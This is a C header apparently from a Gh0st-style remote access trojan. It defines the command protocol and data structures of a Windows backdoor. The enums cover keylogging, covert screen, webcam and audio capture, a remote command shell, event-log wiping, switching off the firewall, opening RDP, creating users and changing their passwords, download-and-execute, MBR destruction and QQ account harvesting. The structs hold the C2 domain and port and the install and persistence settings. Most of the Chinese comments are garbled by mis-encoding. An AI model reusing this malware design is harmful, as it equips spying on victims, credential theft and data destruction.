#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

#include <winsock2.h>
//////////////////////////////////////////////////////////////////////////
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 1,    	// һ��,������ػ���Զ���Ѿ��У�ȡ��
		TRANSFER_MODE_ADDITION,			// ׷��
		TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
		TRANSFER_MODE_OVERWRITE,		// ����
		TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
		TRANSFER_MODE_JUMP,				// ����
		TRANSFER_MODE_JUMP_ALL,			// ȫ������
		TRANSFER_MODE_CANCEL,			// ȡ������
};
enum
{
	COMMAND_LIST_FILES = 1,			// �г�Ŀ¼�е��ļ�
		COMMAND_DOWN_FILES,				// �����ļ�
		COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
		COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
		COMMAND_CONTINUE,				// �������������������������
		COMMAND_STOP,					// ������ֹ
		COMMAND_DELETE_FILE,			// ɾ���ļ�
		COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
		COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
		COMMAND_CREATE_FOLDER,			// �����ļ���
		COMMAND_RENAME_FILE,			// �ļ����ļ�����
		COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
		COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
		COMMAND_FILES_SEARCH_START,     // �����ļ�
		COMMAND_FILES_SEARCH_STOP,      // ֹͣ����
		COMMAND_MOVE_DIRECTORY,         // �ƶ��ļ���
		COMMAND_MOVE_FILE,              // �ƶ��ļ�
		
		
		TOKEN_FILE_LIST,				// �ļ��б�
		TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
		TOKEN_FILE_DATA,				// �ļ�����
		TOKEN_TRANSFER_FINISH,			// �������
		TOKEN_DELETE_FINISH,			// ɾ�����
		TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
		TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
		TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
		TOKEN_DATA_CONTINUE,			// ������������
		TOKEN_RENAME_FINISH,			// �����������
		TOKEN_SEARCH_FILE_LIST,         // �����������ļ�
		TOKEN_SEARCH_FILE_FINISH,       // ȫ���������
		TOKEN_MOVE_FINISH,
TOKEN_COMPRESS_FINISH,		
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_SCREEN_RESET = 1,			// �ı���Ļ���
		COMMAND_ALGORITHM_RESET,		// �ı��㷨
		COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
		COMMAND_SCREEN_CONTROL,			// ��Ļ����
		COMMAND_DISABLE_AERO,           // ����AERO��Ч
		COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
		COMMAND_SCREEN_BLANK,			// ����˺���
		COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
		COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
		COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����
		
		
		TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
		TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
		TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������	
};


//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
    	COMMAND_PSLIST = 1,					// �����б�
		COMMAND_WSLIST,					// �����б�
		COMMAND_SSLIST,                 // �û���Ϣ
		COMMAND_USLIST,                 // ϵͳ�û�
		COMMAND_ASLIST,                 // �û�״̬
		COMMAND_DSLIST,                 // ��������
		COMMAND_SOFTWARELIST,           // ����б�
		COMMAND_NSLIST,
		COMMAND_FULIST,
		COMMAND_REGLIST,                //������
		COMMAND_SYSLIST,                //Ӳ����Ϣ
        COMMAND_MACLIST,                //������Ϣ
		COMMAND_KILLPROCESS,			// �رս���
		COMMAND_KILLPROCESS_WINDOW,     // �رս���(����)
		COMMAND_WINDOW_TEST,            // �������ء���ԭ����󻯡���С��
		COMMAND_WINDOW_CLOSE,           // ���ڹر�

		COMMAND_ACITVEUSER,             // �����û�
		COMMAND_DISABLEEUSER,           // �����û�
		COMMAND_NET_USER,               // ��net����û�
		COMMAND_CHANGE_USERPASS,        // �����û�����
		COMMAND_DELUSER,                // ɾ���û�

		COMMAND_DISCONNECTUSER,         // �Ͽ��û�
		COMMAND_LOGOFF_USER,            // ע���û�

		COMMAND_3389_PORT,              // ����3389�˿�
		COMMAND_OPEN_3389,              // ����3389
		COMMAND_SEND_TERMSRV,           // ����˫��3389�ļ�

		COMMAND_S_SESSION,              // �Ự����
		
		//
		TOKEN_WSLIST,					// �����б�
		TOKEN_SSLIST,                   // ϵͳ��Ϣ
		TOKEN_USLIST,                   // ϵͳ�û�
		TOKEN_ASLIST,                   // �û�״̬
		TOKEN_DIALUPASS,                // ��������
		TOKEN_SOFTWARE,                 // �����Ϣ
        TOKEN_FULIST,
        TOKEN_NSLIST,
		TOKEN_CPUMEMORY,                // cpu �ڴ�ʹ����
 		TOKEN_CHANGE_PSAA_SUCCESS,      // �����û�����ɹ�
		TOKEN_GET_TERMSRV,              // XPϵͳ��ȡ˫��3389�ļ�
		TOKEN_TERMSRV_OK,               // ˫��3389�ɹ�
		TOKEN_RUNIST,                    ///ע���
		TOKEN_SYSIST,
		TOKEN_MACIST,  

};

//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_WEBCAM_RESIZE = 1,    		// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	TOKEN_WEBCAM_DIB,			    	// ����ͷ��ͼ������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_DELETESERVERICE = 100,       // ɾ������
	COMMAND_STARTSERVERICE,              // ��������
	COMMAND_STOPSERVERICE,               // ֹͣ����
	COMMAND_PAUSESERVERICE,              // ��ͣ����
	COMMAND_CONTINUESERVERICE,           // ��������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_REG_ENUM = 1,                 // ö��ע���
		COMMAND_REG_CREATEKEY,            // ����·��
		COMMAND_REG_DELKEY,               // ɾ��·��
		COMMAND_REG_CREATKEY,             // ������
		COMMAND_REG_DELVAL,               // ɾ����
		
		TOKEN_REG_INFO,                   // ע�����Ϣ
		TOKEN_REG_SUCCEED,                // ע���ɹ�
		TOKEN_REG_ERROR,                  // ע������
		TOKEN_REG_KEY,                    // ��ֵ����
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_AUDIO_DATE = 1,             // ���ͱ�����������
		COMMAND_AUDIO_CHANGER,          // ���������豸
		COMMAND_AUDIO_CHANGER_LINES,    // ������������
		
		TOKEN_AUDIO_DATA,               // ��Ƶ����
		TOKEN_AUDIO_CHANGE_FINISH,      // �����ɹ�
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_KEYBOARD_OFFLINE = 1,		// �������߼��̼�¼
		COMMAND_SEND_KEYBOARD,          // ��ȡ���̼�¼����
		COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����
		COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
		TOKEN_KEYBOARD_DATA,			// ���̼�¼������
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	CLEAN_EVENT_ALL = 1,
		CLEAN_EVENT_SYS,
		CLEAN_EVENT_SEC,
		CLEAN_EVENT_APP
};
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_PROXY_CONNECT= 1, //socket5����
		COMMAND_PROXY_CLOSE,
		COMMAND_PROXY_DATA,

		TOKEN_PROXY_CONNECT_RESULT,
		TOKEN_PROXY_CLOSE,
		TOKEN_PROXY_DATA,
		TOKEN_PROXY_BIND_RESULT
};
//////////////////////////////////////////////////////////////////////////
enum
{
	// ���ƶ˷���������

 	COMMAND_SESSION = 0,			// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_UNINSTALL,              // ж��
	COMMAND_RENAME_REMARK,          // ���ı�ע
	COMMAND_CHANGE_GROUP,           // ���ķ���
	COMMAND_CLEAN_EVENT,            // ������־
		
	// ��������
	COMMAND_DOWN_EXEC,              // ����ִ��
	COMMAND_DOWN_UPDATE,            // ���ظ���
	COMMAND_OPEN_URL_SHOW,          // ����ҳ����ʾ��
	COMMAND_OPEN_URL_HIDE,          // ����ҳ�����أ�
	COMMAND_LOCAL_UPLOAD,           // �����ϴ�
	COMMAND_MESSAGEBOX,             // Messagebox
		
	// ɸѡ
	COMMAND_FIND_PROCESS,           // ���ҽ���
	COMMAND_FIND_WINDOW,            // ���Ҵ���
	
	COMMAND_OPEN_PROXY,             // ��������
	COMMAND_CLOSE_PROXY,            // �رմ���
 
	COMMAND_PRANK,                  // �� �� ��

	// ��Ҫ����
	COMMAND_NEXT1,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_NEXT = 100,				// ��һ��(���ƶ��Ѿ��򿪶Ի���)
	COMMAND_LIST_DRIVE,	            // �ļ�����(�г�����Ŀ¼) 
	COMMAND_SCREEN_SPY,				// ��Ļ���
	COMMAND_WEBCAM,					// ����ͷ���
	COMMAND_AUDIO,                  // ��������
	COMMAND_SHELL,					// cmdshell
	COMMAND_SYSTEM,                 // ϵͳ����
	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_SERVICE_MANAGER,	    // �������	
	COMMAND_REGEDIT,                // ע �� ��
	COMMAND_TEXT_CHAT,              // ��������
	COMMAND_PROXY_MAP,				// proxy
    COMMAND_CHAT,
	COMMAND_CHAT_CLOSE,
	COMMAND_KILL_MBR,
	COMMAND_DISCONT,
	COMMAND_GETQQNUM,               //��ȡQQ
	COMMAND_CLORE,					//��ɫ
    COMMAND_Run,                     //RUN
	// Ԥ�� 
	COMMAND_PLUGINME,
	COMMAND_SHOW_QQ,
	COMMAND_QQBOX,
	///////////
	COMMAND_SYSINFO,                //��������Ϣ
	COMMAND_SEND_SYSINFO,			//��ȡ��������Ϣ
	COMMAND_SEND_INSTALLINFO,		//��ȡ��װ��Ϣ
	COMMAND_NET_USERx,				//��net����û�
	COMMAND_GUEST,                  //����GUEST
	COMMAND_STOPFIRE,               //�رշ���ǽ
	COMMAND_CHANGE_PORT,            //�����ն˶˿�
	COMMAND_OPEN_PROXYx,				//����
	COMMAND_CLOSE_3389,				//�ر�3389
	COMMAND_OPEN_3389x,				//����3389
	COMMAND_DLL_3389,				//���Դ���3389dll
	COMMAND_START_MAP,				//����ӳ��
	COMMAND_CLOSE_PORT,				//�ر�ӳ��
	COMMAND_SLIST,					//��ȡϵͳ�û�
	COMMAND_DELUSERx,				//ɾ���û�
	COMMAND_NET_CHANGE_PASS,		//�����û�����
	COMMAND_WTSLIST,				//�����û�
	COMMAND_WTS_Logoff,			    //ע���û�
	COMMAND_WTS_Disconnect,			//�Ͽ��û�

	COMMAND_SCREEN_SPY1,				// ��Ļ�鿴
	COMMAND_AERO_DISABLE1,			// ��������ϳ�(Aero)
	COMMAND_AERO_ENABLE1,			// ��������ϳ�(Aero)
	COMMAND_SCREEN_RESET1,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET1,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL1,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL1,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT1,		// ��������˼����������
	COMMAND_SCREEN_BLANK1,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER1,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD1,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD1,	// ����Զ�̼�����
	
	TOKEN_BITMAPINFO1,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN1,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN1,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT1,			// ��Ļ�鿴ʱ���ͼ���������   
/////////////////////////////////////////////////////////////////////////////////////////

	// ����˷����ı�ʶ
	TOKEN_LOGIN = 200,				// ���߰�
	TOKEN_DRIVE_LIST,				// �ļ������������б�
	TOKEN_BITMAPINFO,				// ��Ļ��أ���Ļ�鿴��BITMAPINFO��
	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ������ͷ��BITMAPINFOHEADER��
	TOKEN_SHELL_START,              // CMD
	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_PSLIST,					// �����б�
	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_SERVICE_LIST,             // �����б�
	TOKEN_REGEDIT,                  // ע���ʼ
	TOKEN_TEXTCHAT_START,           // �������쿪ʼ
	TOKEN_PROXY_START,              // ����ӳ�俪ʼ

	// ����
	TOKEN_FIND_YES,                 // ���Ҵ���
	TOKEN_DLLINFO,                  // �鿴����
	TOKEN_CHAT_START,
	TOKEN_GETQQNUM,

	////
	
	TOKEN_SYSINFOLIST,              // ��Ϣ�б�
	TOKEN_INSTALLINFOLIST,			// ��װ��Ϣ�б�
	TOKEN_ADD_SUCCESS,				// ��ӳɹ�
	TOKEN_ADD_ERROR,				// ���ʧ��
	TOKEN_DEL_SUCCESS,				// ɾ���û��ɹ�
	TOKEN_DEL_ERROR,				// ɾ���û�ʧ��
	TOKEN_CHANGE_PSAA_SUCCESSx,		// �޸�����ɹ�
	TOKEN_CHANGE_PSAA_ERROR,		// �޸�����ʧ��
	TOKEN_DLL_3389,					// ����3389ʧ��
	TOKEN_SLIST,					// ö��ϵͳ�û�
	TOKEN_WTSLIST,					// ö�������û�
	TOKEN_STATE_SUCCESS,			// �����û�״̬�ɹ�
	TOKEN_STATE_ERROR,				// �����û�״̬ʧ��

	// Ԥ��
	
	
	TOKEN_SHOWQQ,
	TOKEN_RECV_QQ,

	
};

struct DLLSERVER_INFO
{
	CHAR szFinder[20];
	CHAR Domain[100];     //����IP
	CHAR QQDomain[100];     //����IP
	WORD Port;            //���߶˿�
	WORD QQPort;            //���߶˿�
	CHAR Version[100];    //����汾
	CHAR Group[100];      //���߷���
	CHAR SocketHead[100]; //ͨ������
	CHAR ServiceName[100];   //��������
	CHAR ServicePlay[128];   //������ʾ
	CHAR ServiceDesc[256];   //��������
	CHAR ReleasePath[100];   //��װ;��
	CHAR ReleaseName[50];    //��װ����
	CHAR Mexi[100];          //���л���
	BOOL Dele_te;            //��װ��ɾ��
	CHAR Dele_zc;            //��������
	WORD Dele_zd;            //��װ����
	BOOL Dele_fs;            //ռ�ӷ�ɾ����װ
	BOOL Dele_Kzj;           //���߼�¼
	BOOL Dele_Cul;           //���߼�¼
	BOOL Zjz;           //���߼�¼
	WORD FileAttribute;      //�ļ�����
	CHAR szDownRun[300];     //�����ַ
//	CHAR URL[256];          //�ؼ���ַ
};
typedef struct __SERVER_DLL_DATA_
{
	char szFindFlags[20];
	DWORD dwDllDataSize;
	UINT Key;
	BYTE pDllData[1024 * 280];			// �����ݴ�С�������DLL�ļ���С

}SERVER_DLL_DATA, *LPSERVER_DLL_DATA;
//��Ϣ�б�ṹ��
//��Ϣ�б�ṹ��
struct tagSystemInfo1
{
	char szSystem[128];     //����ϵͳ
	char szCpuInfo[128];   //CPU��Ϣ
	char szActiveTime[128]; //�ʱ��
	char szAntiVirus[128]; //ɱ�����
	char szUserName[128];   //�û���
	char szRemotePort[128]; //Զ�̶˿�
	DWORD szMemory;         //�ڴ��С 
	DWORD szMemoryFree;     //�����ڴ� 
	DWORD szDriveSize;      //Ӳ�̴�С
	DWORD szDriveFreeSize;  //����Ӳ�̴�С
	char szOpenInfo[128];	// �Ƿ�˫��(�Ƿ���)
};


typedef struct
{	
	BYTE			bToken;			// = 1
	char			UpGroup[32];	// ���߷���
	IN_ADDR	    	IPAddress;	// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	char			CPUClockMhz[20];// CPU��Ϣ
	float				CPUClockMhz1;	// CPU��Ƶ
	int				CPUNumber;	    // CPU����
	DWORD			dwSpeed;		// ����
	UINT			bIsWebCam;		// �Ƿ�������ͷ
	bool            bIsWow64;
	DWORD			MemSize;		// �ڴ��С
	DWORD			DriverSize;		// Ӳ������
	char            szInstallTime[50];
	char            szAntivirus[100];
	char            szOnlinePass[20];
	char            szRunTime[50];
	DWORD           Mbs;           //wangka
	char            Ver[30];
	BOOL			bIsActive;	    // �û�״̬

}LOGININFO;

#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define	MAX_SEND_BUFFER			1024 * 8 // ��������ݳ���
#define MAX_RECV_BUFFER			1024 * 8 // ���������ݳ���

#endif // !defined(AFX_MACROS_H_INCLUDED)